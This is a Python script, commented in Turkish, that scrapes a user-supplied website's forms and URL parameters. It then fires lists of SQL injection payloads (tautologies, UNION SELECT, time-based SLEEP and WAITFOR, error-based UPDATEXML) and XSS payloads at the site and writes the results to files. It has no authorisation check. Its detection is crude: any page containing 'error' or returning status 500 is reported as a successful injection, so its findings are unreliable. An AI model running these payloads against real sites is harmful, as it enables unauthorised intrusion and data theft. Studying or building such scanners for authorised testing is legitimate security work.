import json
import csv
import os
import requests
from urllib.parse import urlparse, parse_qs, urljoin
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
from bs4 import BeautifulSoup

# 📌 GET Parametrelerini Çekme Fonksiyonu
def url_parametreleri_cek(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    param_listesi = []
    
    # Parametreleri kontrol et
    if query_params:
        for param, value in query_params.items():
            param_listesi.append({'parametre': param, 'deger': value[0]})  # Her parametre sadece bir değeri alır
    else:
        param_listesi.append({'parametre': 'No parameters found', 'deger': ''})
    
    return param_listesi

# 📌 Form Verilerini Çekme Fonksiyonu
def form_verisi_olustur(form):
    form_data = {
        'action': form.get('action'),
        'method': form.get('method'),
        'inputs': [],
        'textareas': []
    }

    inputs = form.find_all('input')
    for input_tag in inputs:
        input_data = {
            'name': input_tag.get('name'),
            'type': input_tag.get('type'),
            'placeholder': input_tag.get('placeholder')
        }
        form_data['inputs'].append(input_data)

    textareas = form.find_all('textarea')
    for textarea in textareas:
        textarea_data = {
            'name': textarea.get('name'),
            'placeholder': textarea.get('placeholder')
        }
        form_data['textareas'].append(textarea_data)
    
    return form_data

# 📌 Verileri TXT Olarak Kaydetme
def veri_kaydet_txt(form_data, param_data, folder_path):
    with open(os.path.join(folder_path, "veriler.txt"), 'a', encoding='utf-8') as file:
        file.write("=== FORMLAR ===\n")
        for form in form_data:
            file.write(f"Form Action: {form['action']}\n")
            file.write(f"Form Method: {form['method']}\n")
            for input_tag in form['inputs']:
                file.write(f"Input Name: {input_tag['name']}, Type: {input_tag['type']}, Placeholder: {input_tag['placeholder']}\n")
            for textarea_tag in form['textareas']:
                file.write(f"Textarea Name: {textarea_tag['name']}, Placeholder: {textarea_tag['placeholder']}\n")
            file.write("\n" + "-"*20 + "\n")

        file.write("\n=== URL PARAMETRELERİ ===\n")
        for param in param_data:
            file.write(f"Parametre: {param['parametre']}, Değer: {param['deger']}\n")
        file.write("\n" + "="*30 + "\n")

# 📌 Verileri JSON Olarak Kaydetme
def veri_kaydet_json(form_data, param_data, folder_path):
    data = {'formlar': form_data, 'parametreler': param_data}
    with open(os.path.join(folder_path, "veriler.json"), 'w', encoding='utf-8') as file:
        json.dump(data, file, indent=4, ensure_ascii=False)

# 📌 Verileri CSV Olarak Kaydetme
def veri_kaydet_csv(form_data, param_data, folder_path):
    with open(os.path.join(folder_path, "veriler.csv"), 'w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(['Veri Türü', 'Form Action', 'Form Method', 'Input Name', 'Input Type', 'Input Placeholder', 'Textarea Name', 'Textarea Placeholder', 'URL Parametre', 'Parametre Değeri'])

        for form in form_data:
            for input_tag in form['inputs']:
                writer.writerow(['Form', form['action'], form['method'], input_tag['name'], input_tag['type'], input_tag['placeholder'], '', '', '', ''])
            for textarea_tag in form['textareas']:
                writer.writerow(['Form', form['action'], form['method'], '', '', '', textarea_tag['name'], textarea_tag['placeholder'], '', ''])

        for param in param_data:
            writer.writerow(['URL Parametre', '', '', '', '', '', '', '', param['parametre'], param['deger']])

# 📌 Kullanıcıdan Kaydetme Seçeneklerini Alma
def dosya_secim():
    folder_name = input("Kaydetmek istediğiniz klasör adını girin (örn. 'veriler'): ")

    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
        print(f"{folder_name} adlı klasör oluşturuldu.")

    file_formats = input("Hangi formatlarda kaydetmek istersiniz? (txt, json, csv) - Birden fazla formatı seçmek için virgülle ayırarak yazın: ").lower()
    file_formats = [fmt.strip() for fmt in file_formats.split(',')]

    return folder_name, file_formats

# 📌 SQLi Payloads
def sqli_payloads():
    return [
        "' OR '1'='1", "' OR 1=1 --", '" OR "1"="1', "' UNION SELECT null,null,null --",
        "admin' --", "' OR 'a'='a", "' AND 1=1 --", "' AND 1=2 --", "' OR 1=1 LIMIT 1 --",
        "' AND 1=1", "' AND 1=2", "' AND 1=0", "' AND 1=1 ORDER BY 1 --", "' AND 1=1 ORDER BY 100 --",
        "' OR IF(1=1, SLEEP(5), 0) --", "' OR IF(1=2, SLEEP(5), 0) --", "'; WAITFOR DELAY '0:0:5' --",
        "' UNION SELECT NULL, NULL, NULL --", "' UNION SELECT 1, user(), database() --", 
        "' UNION SELECT 1,2,3,4 --",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password') --",
        "' OR 1=1 AND UPDATEXML(1, CONCAT(0x3c736563, user(), 0x3e), 1) --",
        "1' AND LENGTH(database()) > 0 --", "1' AND SUBSTRING(database(), 1, 1) = 'm' --"
    ]

# 📌 URL'yi Test Etme (SQLi)
def test_sqli_on_url(url, payloads):
    results = []
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        
        if "error" in response.text.lower() or response.status_code == 500:
            results.append(f"SQLi zafiyeti tespit edildi ve başarılı şekilde çalıştırıldı: {test_url}")
    
    if not results:
        results.append("SQLi zafiyeti tespit edilmedi.")
    
    return results

# 📌 XSS Payloads
def xss_payloads():
    return [
        '<script>alert("XSS")</script>', '<img src=x onerror=alert("XSS")>', '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>', '"><img src=x onerror=alert("XSS")>', '"><svg onload=alert("XSS")>'
    ]

# 📌 URL'de XSS Testi Yapma
def test_xss_on_url(url, payloads):
    results = []
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        
        if payload in response.text:
            results.append(f"XSS zafiyeti tespit edildi: {test_url}")
    
    if not results:
        results.append("XSS zafiyeti tespit edilmedi.")
    
    return results

# 📌 Formlarda XSS Testi Yapma
def test_xss_on_forms(base_url, forms, payloads):
    results = []
    for form in forms:
        action = form.get('action')
        if not action.startswith(('http://', 'https://')):
            action = urljoin(base_url, action)
        method = form.get('method', 'get').lower()
        for payload in payloads:
            data = {}
            for input_tag in form.find_all('input'):
                if input_tag.get('name'):
                    data[input_tag.get('name')] = payload
            
            if method == 'post':
                response = requests.post(action, data=data)
            else:
                response = requests.get(action, params=data)
            
            if payload in response.text:
                results.append(f"XSS zafiyeti tespit edildi: {action} ile payload {payload}")
    
    if not results:
        results.append("XSS zafiyeti tespit edilmedi.")
    
    return results

# 📌 URL ve Form Verilerini Çekme ve Test Etme
def url_al():
    url = input("İstediğiniz URL'yi girin. || q ile çıkış sağlayın. \n")
    
    if url == 'q':
        print("Çıkış yapılıyor...")
        return
    else:
        url = url if url.startswith(("http://", "https://")) else "https://" + url  
        url = url if "www." in url else url.replace("https://", "https://www.")
        
        print("URL'ye ulaşıldı")
        
        try:
            html = urlopen(url).read()
        except (URLError, HTTPError) as e: 
            print("Siteye ulaşılamadı:", e)
            return

        soup = BeautifulSoup(html, 'html.parser')
        
        forms = soup.find_all('form')
        form_data_list = []
        
        for form in forms:
            form_data = form_verisi_olustur(form)
            form_data_list.append(form_data)

        print("\nGET Parametreleri Analiz Ediliyor...")
        param_data_list = url_parametreleri_cek(url)
        
        print("Formlar ve URL parametreleri tespit edildi!")

        # 📌 SQLi Testi Yap
        print("\nSQL Injection testleri yapılıyor...")
        sqli_payloads_list = sqli_payloads()
        sqli_results = test_sqli_on_url(url, sqli_payloads_list)
        
        print("SQL Injection testleri tamamlandı.")
        
        # 📌 XSS Testi Yap
        print("\nXSS testleri yapılıyor...")
        xss_payloads_list = xss_payloads()
        xss_results_url = test_xss_on_url(url, xss_payloads_list)
        xss_results_forms = test_xss_on_forms(url, forms, xss_payloads_list)
        
        print("XSS testleri tamamlandı.")

        # 📌 Dosya formatını belirle
        folder_path, file_formats = dosya_secim()

        # 📌 Verileri kaydet
        if 'txt' in file_formats:
            veri_kaydet_txt(form_data_list, param_data_list, folder_path)
        if 'json' in file_formats:
            veri_kaydet_json(form_data_list, param_data_list, folder_path)
        if 'csv' in file_formats:
            veri_kaydet_csv(form_data_list, param_data_list, folder_path)
        
        # 📌 SQLi ve XSS Sonuçlarını da kaydet
        with open(os.path.join(folder_path, "sql_injection_results.txt"), 'w', encoding='utf-8') as file:
            for result in sqli_results:
                file.write(result + "\n")
                
        with open(os.path.join(folder_path, "xss_results.txt"), 'w', encoding='utf-8') as file:
            for result in xss_results_url + xss_results_forms:
                file.write(result + "\n")
        
        print(f"Tüm veriler ve raporlar {folder_path} klasörüne kaydedildi.")

# 📌 Ana Fonksiyon
if __name__ == "__main__":
    url_al()


# Bu güncellenmiş kod, Türkçe karakterlerin doğru şekilde görüntülenmesi için UTF-8 kodlamasını kullanır. Böylece, dosya yazma işlemlerinde Türkçe karakterler sorunsuz bir şekilde görüntülenir.